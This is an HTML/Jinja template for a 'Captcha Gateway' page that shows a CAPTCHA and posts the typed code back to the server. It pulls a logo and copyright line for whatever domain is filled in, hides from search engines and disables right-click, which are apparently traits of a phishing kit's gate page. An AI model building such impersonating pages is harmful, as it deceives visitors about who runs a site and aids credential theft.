<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <meta name="googlebot" content="noindex, nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captcha Gateway - {{ins}}</title>
  <link rel="icon" href="https://api.kickfire.com/logo?website={{ins}}" type="image/x-icon">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body, html {
      height: 100%;
      font-family: 'Orbitron', sans-serif;
      background: radial-gradient(ellipse at center, #0f0f0f, #000000);
      overflow: hidden;
      color: #fff;
    }

    iframe.background-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -2;
      border: none;
      opacity: 0.1;
      filter: blur(8px) grayscale(100%);
    }

    .login-container {
      max-width: 420px;
      margin: 12vh auto;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.15);
      backdrop-filter: blur(16px);
      padding: 50px 40px;
      border-radius: 16px;
      box-shadow: 0 0 25px rgba(0, 255, 255, 0.1);
      position: relative;
    }

    .login-header {
      text-align: center;
      margin-bottom: 30px;
    }

    .login-header img {
      width: 65px;
      height: 65px;
      object-fit: contain;
      margin-bottom: 15px;
      border-radius: 50%;
      border: 2px solid #0ff;
      box-shadow: 0 0 12px #0ff88c;
    }

    .login-header h1 {
      font-size: 24px;
      font-weight: bold;
      color: #00ffff;
      text-shadow: 0 0 6px #00ffff88;
    }

    .captcha-image {
      display: block;
      margin: 0 auto 20px;
      width: 100%;
      border: 2px dashed #00ffee;
      padding: 8px;
      border-radius: 12px;
      background-color: rgba(0, 255, 255, 0.05);
    }

    form {
      display: flex;
      flex-direction: column;
      gap: 18px;
    }

    label {
      font-size: 14px;
      font-weight: bold;
      color: #88ffff;
    }

    input[type="text"] {
      padding: 14px;
      font-size: 16px;
      border: 1.5px solid #00f0ff88;
      background-color: rgba(255, 255, 255, 0.07);
      border-radius: 8px;
      color: #fff;
      outline: none;
    }

    input[type="text"]::placeholder {
      color: #bbbbbb;
    }

    input[type="text"]:focus {
      border-color: #00f0ff;
      box-shadow: 0 0 5px #00f0ff;
    }

    button {
      background: linear-gradient(135deg, #00ffff, #0077ff);
      color: #000;
      font-size: 15px;
      font-weight: bold;
      padding: 14px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      box-shadow: 0 0 10px #00f0ff88;
      transition: transform 0.2s ease;
    }

    button:hover {
      transform: scale(1.05);
    }

    .error-message {
      font-size: 13px;
      color: #ff4444;
      margin-top: 10px;
      text-align: center;
    }

    .privacy-note {
      font-size: 11px;
      color: #cccccc;
      margin-top: 30px;
      text-align: center;
    }

    /* Extra visual effects */
    .login-container::before {
      content: "";
      position: absolute;
      top: -25%;
      left: -25%;
      width: 150%;
      height: 150%;
      background: conic-gradient(from 180deg, #0ff, #0077ff, #0ff);
      animation: rotate 6s linear infinite;
      filter: blur(50px);
      z-index: -1;
      opacity: 0.1;
    }

    @keyframes rotate {
      0% {
        transform: rotate(0deg)
      }
      100% {
        transform: rotate(360deg)
      }
    }
  </style>
</head>

<body oncontextmenu="return false;">

  <div class="login-container">
    <div class="login-header">
      <img src="https://api.kickfire.com/logo?website={{ins}}" alt="Logo">
      <h1>Captcha Gateway</h1>
    </div>

    <form method="POST" action="/">
      <img class="captcha-image" src="data:image/png;base64,{{ captcha_image }}" alt="CAPTCHA Image" />

      <label for="code">Enter the characters below:</label>
      <input type="text" id="code" name="code" required placeholder="Your Code Here">

      <button type="submit">Confirm Access</button>

      {% if error %}
        <div class="error-message">{{ message }}</div>
      {% endif %}
    </form>

    <div class="privacy-note">
      &copy; {{ins}} Network | All rights reserved
    </div>
  </div>

</body>

</html>
